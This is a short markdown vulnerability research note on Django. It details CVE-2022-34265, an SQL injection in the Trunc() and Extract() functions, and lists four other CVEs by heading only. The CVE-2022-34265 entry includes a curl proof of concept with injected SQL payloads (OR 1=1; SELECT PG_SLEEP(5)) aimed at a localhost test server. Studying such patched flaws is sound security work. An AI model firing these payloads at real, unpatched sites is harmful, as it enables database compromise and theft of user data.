# Django Vulnerability Research

## Vulnerabilities

### [CVE-2022-34265](https://www.cvedetails.com/cve/CVE-2022-34265)

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command
- **CVSS**: 9.8 CRITICAL
- **EPSS**: 0.54%
- 
##### Cause

- SQL Injection due to an Improper Neutralization of special elements used in the following functions with these arguments:
	- `Trunc()` - `kind`
	- `Extract()` - `lookup_name`

##### Impact

- Complete compromise of user information

#### Commit

- [Refs CVE-2022-34265 -- Properly escaped Extract() and Trunc() parameters.](https://github.com/django/django/pull/15820/commits/877c800f255ccaa7abde1fb944de45d1616f5cc9)
- [Refs CVE-2022-34265 -- Unified DatabaseOperations._convert_*_to_tz() hook names.](https://github.com/django/django/commit/5e2f4ddf2940704a26a4ac782b851989668d74db)

#### PoC

```bash
# Normal URL
curl "http://localhost:4131/extract/?lookup_name=year"
curl "http://localhost:4131/trunc/?kind=year"

# URL where the database instruction can be executed
curl "http://localhost:4131/extract/?lookup_name=year%27%20FROM%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--"
curl "http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--"
```

- Discovered by **Takuto Yoshikai (Aeye Security Lab)**
- Please check the following GitHub Repository for more information: [CVE-2022-34265](https://github.com/aeyesec/CVE-2022-34265)

### [CVE-2020-13524](https://nvd.nist.gov/vuln/detail/CVE-2020-13524)

### [CVE-2020-7471](https://nvd.nist.gov/vuln/detail/CVE-2020-7471)

### [CVE-2019-19844](https://nvd.nist.gov/vuln/detail/CVE-2019-19844)

### [CVE-2014-0472](https://nvd.nist.gov/vuln/detail/CVE-2014-0472)

## Resources

- [Django - Archive of security issues](https://docs.djangoproject.com/en/dev/releases/security/)
